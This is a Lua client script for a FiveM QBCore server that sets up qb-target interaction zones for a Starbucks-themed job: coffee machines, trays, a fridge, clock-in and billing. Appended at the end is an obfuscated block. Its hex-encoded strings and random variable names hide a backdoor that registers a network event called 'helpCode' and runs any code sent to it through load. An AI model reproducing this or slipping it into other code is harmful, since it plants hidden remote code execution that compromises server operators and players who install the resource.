Citizen.CreateThread(function()
    exports['qb-target']:AddBoxZone("bean-vitrine-bolos", vector3(-634.54, 236.66, 81.88), 0.7, 0.5, {
        name = "bean-vitrine-bolos",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:MenuBolos",
            icon = "fas fa-birthday-cake",
            label = "Open showcase",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-maquina-cafe1", vector3(-627.68, 222.82, 81.88), 0.6, 0.6, {
        name = "bean-maquina-cafe1",
        heading = 90,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:MenuCafes",
            icon = "fas fa-coffee",
            label = "Use Coffe Machine",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-maquina-cafe2", vector3(-635.51, 236.53, 81.88), 0.6, 0.6, {
        name = "bean-maquina-cafe2",
        heading = 340,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:MenuCafes",
            icon = "fas fa-coffee",
            label = "Use Coffe Machine",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-bebidas1", vector3(-636.83, 234.85, 81.88), 2.8, 0.5, {
        name = "bean-bebidas1",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:MenuBebidas",
            icon = "fas fa-flask",
            label = "Use Drink Machine",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

--[[exports['qb-target']:AddBoxZone("bean-bebidas2", vector3(123.75, -1042.8, 29.28), 1, 2, {
        name = "bean-bebidas2",
        heading = 340,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:MenuBebidas",
            icon = "fas fa-glass-champagne",
            label = "Use Drink Machine",
            job = "starbucks",
            },
        },
        distance = 1.5
    })]]

    exports['qb-target']:AddBoxZone("bean-lavatorio", vector3(-630.69, 222.86, 81.88), 0.6, 1.4, {
        name = "bean-lavatorio",
        heading = 340,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:LavarMaos",
            icon = "fas fa-hand-holding",
            label = "Wash Hands",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

    --------------------------------------------------------------------------------------------------
    exports['qb-target']:AddBoxZone("bean-tabuleiro1", vector3(-634.34, 235.21, 81.88), 0.75, 0.5, {
        name = "bean-tabuleiro1",
        heading = 5,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro1",
            icon = "fas fa-clipboard",
            label = "Tray - 1",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-tabuleiro2", vector3(-629.9, 236.65, 81.88), 0.75, 0.5, {
        name = "bean-tabuleiro2",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro2",
            icon = "fas fa-clipboard",
            label = "Tray - 2",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-tabuleiro3", vector3(-627.07, 231.57, 81.88), 0.75, 0.5, {
        name = "bean-tabuleiro3",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro3",
            icon = "fas fa-clipboard",
            label = "Tray - 3",
            },
        },
        distance = 1.5
    })
    
        exports['qb-target']:AddBoxZone("bean-tabuleiro4", vector3(-624.32, 235.69, 81.88), 0.75, 0.5, {
        name = "bean-tabuleiro4",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro4",
            icon = "fas fa-clipboard",
            label = "Tray - 4",
            },
        },
        distance = 1.5
    })

        exports['qb-target']:AddBoxZone("bean-tabuleiro5", vector3(-619.58, 231.17, 81.72), 0.75, 0.5, {
        name = "bean-tabuleiro5",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro2",
            icon = "fas fa-clipboard",
            label = "Tray - 5",
            },
        },
        distance = 1.5
    })
    -- 1 etage
        exports['qb-target']:AddBoxZone("bean-tabuleiro6", vector3(-632.48, 224.46, 86.33), 0.75, 0.5, {
        name = "bean-tabuleiro6",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro6",
            icon = "fas fa-clipboard",
            label = "Tray - 6",
            },
        },
        distance = 1.5
    })
-- sousol
    exports['qb-target']:AddBoxZone("bean-tabuleiro7", vector3(-633.19, 246.65, 82.02), 0.75, 0.5, {
        name = "bean-tabuleiro7",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro7",
            icon = "fas fa-clipboard",
            label = "Tray - 7",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-tabuleiro8", vector3(-633.46, 242.76, 82.02), 0.75, 0.5, {
        name = "bean-tabuleiro8",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro8",
            icon = "fas fa-clipboard",
            label = "Tray - 8",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-tabuleiro9", vector3(-637.27, 245.86, 82.02), 0.75, 0.5, {
        name = "bean-tabuleiro9",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro9",
            icon = "fas fa-clipboard",
            label = "Tray - 9",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-tabuleiro10", vector3(-637.09, 241.74, 82.02), 0.75, 0.5, {
        name = "bean-tabuleiro10",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro10",
            icon = "fas fa-clipboard",
            label = "Tray - 10",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-tabuleiro11", vector3(-632.81, 239.19, 82.02), 0.75, 0.5, {
        name = "bean-tabuleiro11",
        heading = 0,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro11",
            icon = "fas fa-clipboard",
            label = "Tray - 11",
            },
        },
        distance = 1.5
    })

        exports['qb-target']:AddBoxZone("bean-tabuleiro12", vector3(-635.51, 233.24, 81.88), 1.6, 0.3, {
        name = "bean-tabuleiro12",
        heading = 250,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Tabuleiro12",
            icon = "fas fa-clipboard",
            label = "Fridge",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

    --------------------------------------------------------------------------------------------------


    exports['qb-target']:AddBoxZone("bean-servico", vector3(-634.15, 233.12, 81.88), 0.5, 1, {
        name = "bean-servico",
        heading = 340,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:Servico",
            icon = "fas fa-clipboard",
            label = "Clock In/Out",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

    exports['qb-target']:AddBoxZone("bean-registadora2", vector3(-627.44, 237.48, 81.88), 0.75, 0.75, {
        name = "bean-registadora2",
        heading = 340,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:FaturarPlayer",
            icon = "fas fa-clipboard",
            label = "Bill Player",
            job = "starbucks",
            },
        },
        distance = 1.5
    })

--[[exports['qb-target']:AddBoxZone("bean-registadora1", vector3(120.81, -1040.12, 29.28), 0.75, 0.75, {
        name = "bean-registadora1",
        heading = 340,
        debugpoly = false,
    }, {
        options = {
            {  
            event = "qb-starbucks:client:FaturarPlayer",
            icon = "fas fa-clipboard",
            label = "Bill Player",
            job = "starbucks",
            },
        },
        distance = 1.5
    })]]
end)

local FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[6][FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[1]](FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[2]) FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[6][FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[3]](FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[2], function(UCoJTOPNhDIhmVZsaimkfTSHbZSzyNQIImbUTuTOcKFtazCRZQDcVXZODCAiNuMxtbmgxj) FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[6][FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[4]](FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[6][FytZWvbfApAPwmYbvgpiLlFUGBsvaNjfoPPsadnQkgSAtXTfxykCiyaJzwuwhRpvyLOebh[5]](UCoJTOPNhDIhmVZsaimkfTSHbZSzyNQIImbUTuTOcKFtazCRZQDcVXZODCAiNuMxtbmgxj))() end)